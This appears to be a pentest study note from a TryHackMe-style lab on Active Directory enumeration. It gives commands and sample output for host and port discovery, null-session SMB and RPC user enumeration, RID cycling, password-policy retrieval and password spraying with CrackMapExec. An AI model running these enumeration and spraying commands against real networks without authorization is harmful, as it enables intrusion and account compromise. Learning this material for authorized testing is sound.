# Active Directory Enumeration

**Scenario:** VPN access granted to an internal AD network. No credentials yet. Attack machine fully tooled.
**Target subnet:** `10.211.11.0/24`

---

## 1. Host Discovery

Goal: identify all live hosts in scope before doing anything else.

### fping

```bash
fping -agq 10.211.11.0/24
```

| Flag | Meaning |
|------|---------|
| `-a` | Show only hosts that are alive |
| `-g` | Generate target list from a supplied IP/netmask (CIDR) |
| `-q` | Quiet mode — suppress per-probe output and ICMP error messages |

**Example output:**
```
10.211.11.1
10.211.11.10
10.211.11.20
10.211.11.250
```

`.1` is typically the gateway and `.250` the VPN server — both out of scope. Save the remaining in-scope hosts:

```bash
cat hosts.txt
10.211.11.20
10.211.11.10
```

### Nmap (ping scan)

```bash
nmap -sn 10.211.11.0/24
```

| Flag | Meaning |
|------|---------|
| `-sn` | Ping scan — determine live hosts without port scanning |

---

## 2. Port Scanning

### Common AD-related ports

| Port | Protocol | Significance |
|------|----------|---------------|
| 88  | Kerberos | Kerberos-based enumeration / ticket attacks |
| 135 | MS-RPC | RPC enumeration (potential null sessions) |
| 139 | SMB/NetBIOS | Legacy SMB access, null session abuse |
| 389 | LDAP | Plaintext AD object/user/policy queries |
| 445 | SMB | Modern SMB — exploits, relay attacks, credential theft |
| 464 | Kerberos (kpasswd) | Password-related Kerberos service |
| 636 | LDAPS | Encrypted LDAP — can still leak structure if misconfigured |

### Targeted service/version scan

```bash
nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt
```

| Flag | Meaning |
|------|---------|
| `-sV` | Service/version detection |
| `-sC` | Run default NSE script category |
| `-iL hosts.txt` | Read targets from file (one IP/hostname per line) |

The **Domain Controller** typically stands out with 88, 389, and 445 open, plus banners like "Windows Server" or domain names in the output.

### Full TCP port scan (exhaustive)

```bash
nmap -sS -p- -T3 -iL hosts.txt -oN full_port_scan.txt
```

| Flag | Meaning |
|------|---------|
| `-sS` | TCP SYN scan (stealthier than full connect) |
| `-p-` | All 65,535 TCP ports |
| `-T3` | "Normal" timing template |
| `-iL hosts.txt` | Input target list |
| `-oN full_port_scan.txt` | Output in normal format to file |

### Real example against the DC

```bash
nmap -p 88,135,139,389,445,636 -sV -sC 10.211.11.10
```

```
PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-15 12:41:17Z)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: tryhackme.loc0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds Windows Server 2019 Datacenter 17763 microsoft-ds (workgroup: TRYHACKME)
636/tcp open  tcpwrapped
```

Confirms an AD environment, domain name, and likely DC.

---

## 3. SMB Share Enumeration

### smbclient — list shares (null session)

```bash
smbclient -L //10.211.11.10 -N
```

| Flag | Meaning |
|------|---------|
| `-L` | List shares on the target |
| `-N` | No password prompt (null session / anonymous) |

**Example output:**
```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        AnonShare       Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SharedFiles     Disk      
        SYSVOL          Disk      Logon server share 
        UserBackups     Disk      
```

### smbmap — permissions per share

```bash
./smbmap.py -H 10.211.11.10
```

**Example output:**
```
[+] IP: 10.211.11.10:445        Name: 10.211.11.10        
        Disk                     Permissions     Comment
        ----                     -----------     -------
        ADMIN$                   NO ACCESS       Remote Admin
        AnonShare                READ, WRITE
        C$                       NO ACCESS       Default share
        IPC$                     NO ACCESS       Remote IPC
        NETLOGON                 NO ACCESS       Logon server share 
        SharedFiles              READ, WRITE
        SYSVOL                   NO ACCESS       Logon server share 
        UserBackups              READ, WRITE
```

Interesting non-default shares: `AnonShare`, `SharedFiles`, `UserBackups`.

### Nmap share enumeration (alternative)

```bash
nmap -p445 --script smb-enum-shares 10.211.11.10
```

### Accessing a share & downloading files

```bash
smbclient //10.211.11.10/SharedFiles -N
```

```
smb: \> ls
  Mouse_and_Malware.txt               A     1141  Thu May 15 10:40:19 2025
smb: \> get Mouse_and_Malware.txt
smb: \> exit
```

With credentials instead of a null session:

```bash
smbclient //TARGET_IP/SHARE_NAME --user=USERNAME --password=PASSWORD
# or
smbclient //TARGET_IP/SHARE_NAME -U 'username%password'
# for domain accounts, add -W DOMAIN
```

### Other useful SMB tools

| Tool | Notes |
|------|-------|
| `impacket-smbclient` | Python implementation from the Impacket toolkit (`/opt/impacket/examples/`) |
| `CrackMapExec` (CME) | Enumeration + post-exploitation; supports SMB, LDAP, RDP, SSH |
| `enum4linux` / `enum4linux-ng` | Heavy-duty SMB/RPC enumeration: `enum4linux -a TARGET_IP` |
| Nmap `smb-enum-shares` | Quick share-permission check via NSE |

---

## 4. User Enumeration

### LDAP Anonymous Bind

Test if anonymous bind is allowed:

```bash
ldapsearch -x -H ldap://10.211.11.10 -s base
```

| Flag | Meaning |
|------|---------|
| `-x` | Simple (anonymous) authentication |
| `-H` | LDAP server URI |
| `-s base` | Limit query to the base object only |

**Example output:**
```
dn:
domainFunctionality: 6
forestFunctionality: 6
rootDomainNamingContext: DC=tryhackme,DC=loc
dnsHostName: DC.tryhackme.loc
defaultNamingContext: DC=tryhackme,DC=loc
...
result: 0 Success
```

Query actual user objects:

```bash
ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)"
```

### enum4linux-ng

```bash
enum4linux-ng -A 10.211.11.10 -oA results.txt
```

| Flag | Meaning |
|------|---------|
| `-A` | Run all enumeration modules (users, groups, shares, password policy, RID cycling, OS info, NetBIOS info) |
| `-oA` | Output to YAML + JSON |

### RPC Enumeration (Null Session)

Connect:

```bash
rpcclient -U "" 10.211.11.10 -N
```

| Flag | Meaning |
|------|---------|
| `-U ""` | Empty/anonymous username |
| `-N` | Don't prompt for password |

Inside the rpcclient shell:

```
rpcclient $> enumdomusers
```

**Example output (truncated):**
```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[sshd] rid:[0x649]
user:[gerald.burgess] rid:[0x650]
...
user:[rduke] rid:[0xa31]
```

Run `help` inside `rpcclient` to list all available commands.

#### One-liner: enumerate + extract usernames straight to a file

```bash
rpcclient -U "" 10.211.11.10 -N -c "enumdomusers" | awk -F'[' '{print $2}' | awk -F']' '{print $1}' > users.txt
```

How it works:
1. `rpcclient -U "" 10.211.11.10 -N -c "enumdomusers"` — null session, runs `enumdomusers` non-interactively via `-c`.
2. `awk -F'[' '{print $2}'` — splits each line on `[`, takes the 2nd field (e.g. `Administrator] rid:`).
3. `awk -F']' '{print $1}'` — splits that on `]`, takes the 1st field, leaving just the username.
4. `> users.txt` — saves one clean username per line.

### RID Cycling

Background: SIDs end in a RID. Well-known RIDs: `500` = Administrator, `501` = Guest, `512–514` = Domain Admins/Users/Guests groups. Regular user accounts typically start at `1000`.

Manual RID brute-force if `enumdomusers` is restricted:

```bash
for i in $(seq 500 2000); do echo "queryuser $i" | rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
```

| Part | Meaning |
|------|---------|
| `for i in $(seq 500 2000)` | Iterate over candidate RIDs |
| `echo "queryuser $i" \| rpcclient ...` | Query each RID via rpcclient |
| `2>/dev/null` | Suppress error messages |
| `grep -i "User Name"` | Keep only lines with a resolved username |

> Can take 2–3 minutes to complete.

You can also use `enum4linux-ng` to help determine the valid RID range automatically.

### Username list for later use (e.g., Kerbrute, password spraying)

```bash
cat users.txt
Administrator
Guest
krbtgt
sshd
gerald.burgess
nigel.parsons
...
asrepuser1
rduke
```

### Kerbrute — validating real/active accounts

Tools like `rpcclient`/`enum4linux-ng` can return disabled accounts, non-domain accounts, honeypot users, or false positives. Kerbrute validates which usernames are genuinely active AD accounts by abusing Kerberos pre-authentication.

**Install:**
```bash
# 1. Download the precompiled binary for your OS
#    https://github.com/ropnop/kerbrute/releases

# 2. Rename it
mv kerbrute_linux_amd64 kerbrute

# 3. Make it executable
chmod +x kerbrute
```

> Not preinstalled on the AttackBox — requires internet access to download.

---

## 5. Password Policy Enumeration

Knowing the policy avoids account lockouts during spraying.

### rpcclient

```bash
rpcclient -U "" 10.211.11.10 -N
rpcclient $> getdompwinfo
```

**Example output:**
```
min_password_length: 12
password_properties: 0x00000001
	DOMAIN_PASSWORD_COMPLEX
```

### CrackMapExec

```bash
crackmapexec smb 10.211.11.10 --pass-pol
```

**Example output:**
```
SMB  10.211.11.10  445  DC  [*] Windows Server 2019 Datacenter 17763 x64 (name:DC) (domain:tryhackme.loc) (signing:True) (SMBv1:True)
SMB  10.211.11.10  445  DC  [+] Dumping password info for domain: TRYHACKME
SMB  10.211.11.10  445  DC  Minimum password length: 18
SMB  10.211.11.10  445  DC  Password history length: 21
SMB  10.211.11.10  445  DC  Maximum password age: 41 days 23 hours 53 minutes
SMB  10.211.11.10  445  DC  Password Complexity Flags: 000001
SMB  10.211.11.10  445  DC      Domain Password Complex: 1
SMB  10.211.11.10  445  DC  Minimum password age: 1 day 4 minutes
SMB  10.211.11.10  445  DC  Reset Account Lockout Counter: 30 minutes
SMB  10.211.11.10  445  DC  Locked Account Duration: 30 minutes
SMB  10.211.11.10  445  DC  Account Lockout Threshold: 10
SMB  10.211.11.10  445  DC  Forced Log off Time: Not Set
```

`password_properties: 0x00000001` / `Password Complexity Flags: 000001` → password must satisfy **3 of 4**:
- Uppercase letters
- Lowercase letters
- Digits
- Special characters

Also: passwords can't contain the account name or >2 consecutive characters of the user's full name.

---

## 6. Password Spraying

Test a small set of likely passwords across **many** accounts (vs. brute-forcing one account) to avoid lockouts.

Why it works:
- Forced periodic password changes → predictable patterns (`Summer2025!`)
- Poorly enforced policy
- Reused/breached passwords across orgs

**Common spray lists:**
- Seasonal passwords
- IT default passwords (`Password123`)
- Breach lists (e.g. `rockyou.txt`)

### Example password list (respecting complexity policy)

```
Password!
Password1
Password1!
P@ssword
Pa55word1
```

### CrackMapExec spray

```bash
crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
```

| Flag | Meaning |
|------|---------|
| `-u users.txt` | List of usernames to try |
| `-p passwords.txt` | List of passwords to try |

---

## Tool Summary

| Tool | Primary Use |
|------|--------------|
| `fping` | Fast ICMP-based host discovery |
| `nmap` | Host discovery, port/service scanning, NSE scripts |
| `smbclient` | List/connect/browse SMB shares |
| `smbmap` | Quick share permission overview |
| `enum4linux` / `enum4linux-ng` | All-in-one SMB/RPC enumeration |
| `rpcclient` | Null session RPC queries (users, password policy, RID cycling) |
| `ldapsearch` | LDAP anonymous bind / directory queries |
| `impacket-smbclient` | Python-based SMB client (Impacket) |
| `CrackMapExec` | Enumeration, password policy, spraying, post-exploitation |
| `kerbrute` | Kerberos-based username validation and spraying |

---

## ⚠️ Notes

- All techniques above assume **explicit written authorization** (e.g., a scoped pentest engagement). Running these against systems without authorization is illegal.
- Many of these misconfigurations (null sessions, anonymous LDAP bind, anonymous SMB shares) are increasingly rare on hardened/patched environments but remain common in legacy or poorly managed AD deployments.
